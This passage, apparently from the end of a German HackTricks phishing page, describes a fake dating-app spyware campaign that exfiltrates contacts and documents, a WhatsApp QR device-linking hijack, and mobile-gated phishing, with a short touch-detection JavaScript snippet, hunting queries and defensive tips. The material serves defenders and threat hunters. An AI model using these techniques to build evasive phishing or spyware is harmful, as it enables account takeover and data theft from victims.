* Die APK bettet statische Credentials und pro Profil „unlock codes“ ein (keine Server‑Auth). Opfer folgen einem gefälschten Exklusivitäts‑Flow (login → locked profiles → unlock) und werden bei korrekten Codes in WhatsApp‑Chats mit vom Angreifer kontrollierten `+92`‑Nummern weitergeleitet, während spyware still im Hintergrund läuft.
* Die Sammlung beginnt bereits vor dem Login: sofortige Exfil von **device ID**, Kontakten (als `.txt` aus dem Cache) und Dokumenten (Bilder/PDF/Office/OpenXML). Ein Content Observer lädt neue Fotos automatisch hoch; ein geplanter Job durchsucht alle **5 Minuten** erneut nach neuen Dokumenten.
* Persistenz: registriert sich für `BOOT_COMPLETED` und hält einen **foreground service** am Leben, um Neustarts und das Beenden im Hintergrund zu überstehen.

### WhatsApp device-linking hijack via QR social engineering
* Eine Köderseite (z. B. gefälschter Ministeriums-/CERT‑„channel“) zeigt einen WhatsApp Web/Desktop QR und fordert das Opfer auf, ihn zu scannen, wodurch der Angreifer stillschweigend als **linked device** hinzugefügt wird.
* Der Angreifer erhält sofort Chat-/Kontakt‑Sichtbarkeit, bis die Sitzung entfernt wird. Opfer sehen möglicherweise später eine „new device linked“-Benachrichtigung; Verteidiger können nach unerwarteten device-link‑Ereignissen kurz nach Besuchen untrusted QR‑Seiten suchen.

### Mobile‑gated phishing to evade crawlers/sandboxes
Operatoren sperren ihre Phishing‑Flows zunehmend hinter einer einfachen Geräteprüfung ab, sodass Desktop‑Crawler nie die finalen Seiten erreichen. Ein typisches Muster ist ein kleines Script, das auf einen touch‑fähigen DOM prüft und das Ergebnis an einen Server‑Endpoint postet; Non‑mobile Clients erhalten HTTP 500 (oder eine leere Seite), während Mobile‑Nutzer den vollständigen Flow ausgeliefert bekommen.

Minimaler Client‑Snippet (typische Logik):
```html
<script src="/static/detect_device.js"></script>
```
`detect_device.js` Logik (vereinfacht):
```javascript
const isMobile = ('ontouchstart' in document.documentElement);
fetch('/detect', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({is_mobile:isMobile})})
.then(()=>location.reload());
```
Häufig beobachtetes Serververhalten:
- Setzt beim ersten Laden ein Session-Cookie.
- Akzeptiert `POST /detect {"is_mobile":true|false}`.
- Gibt 500 (oder Platzhalter) auf nachfolgende GETs zurück, wenn `is_mobile=false`; liefert phishing nur wenn `true`.

Hunting und Erkennungsheuristiken:
- urlscan query: `filename:"detect_device.js" AND page.status:500`
- Web‑Telemetrie: Sequenz von `GET /static/detect_device.js` → `POST /detect` → HTTP 500 für Nicht‑Mobile; legitime mobile Benutzerpfade geben 200 mit anschließendem HTML/JS zurück.
- Blockiere oder überprüfe Seiten, die Inhalte ausschließlich anhand von `ontouchstart` oder ähnlichen Geräte‑Abfragen anpassen.

Abwehrtipps:
- Führe Crawler mit mobilen Fingerprints und aktiviertem JS aus, um zugangsbeschränkte Inhalte aufzudecken.
- Alarm bei verdächtigen 500‑Antworten nach `POST /detect` auf neu registrierten Domains.

## Referenzen

- [https://zeltser.com/domain-name-variations-in-phishing/](https://zeltser.com/domain-name-variations-in-phishing/)
- [https://0xpatrik.com/phishing-domains/](https://0xpatrik.com/phishing-domains/)
- [https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/](https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/)
- [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)
- [2025 Unit 42 Global Incident Response Report – Social Engineering Edition](https://unit42.paloaltonetworks.com/2025-unit-42-global-incident-response-report-social-engineering-edition/)
- [Silent Smishing – mobile-gated phishing infra and heuristics (Sekoia.io)](https://blog.sekoia.io/silent-smishing-the-hidden-abuse-of-cellular-router-apis/)
- [The Next Frontier of Runtime Assembly Attacks: Leveraging LLMs to Generate Phishing JavaScript in Real Time](https://unit42.paloaltonetworks.com/real-time-malicious-javascript-through-llms/)
- [Love? Actually: Fake dating app used as lure in targeted spyware campaign in Pakistan](https://www.welivesecurity.com/en/eset-research/love-actually-fake-dating-app-used-lure-targeted-spyware-campaign-pakistan/)
- [ESET GhostChat IoCs and samples](https://github.com/eset/malware-ioc/tree/master/ghostchat)

{{#include ../../banners/hacktricks-training.md}}
